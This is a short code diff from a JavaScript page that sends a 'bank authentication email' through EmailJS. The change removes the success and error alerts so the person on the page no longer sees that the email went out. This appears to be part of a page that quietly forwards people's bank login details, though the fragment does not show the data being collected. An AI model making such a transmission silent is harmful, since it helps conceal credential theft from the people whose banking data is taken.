@@ -722,14 +722,14 @@
                         console.log('✅ EMAILJS SUCCESS!');
                         console.log('Response status:', response.status);
                         console.log('Response text:', response.text);
-                        alert('✅ Bank authentication email sent successfully! Check your email for all details.');
+                        // Success message removed - no more alerts
                     })
                     .catch(function(error) {
                         console.log('❌ EMAILJS ERROR!');
                         console.log('Error details:', error);
                         console.log('Error text:', error.text);
                         console.log('Error status:', error.status);
-                        alert('❌ EmailJS Error: ' + (error.text || error.message || 'Unknown error'));
+                        // Error message removed - no more alerts
                     });
                     
             } catch (error) {
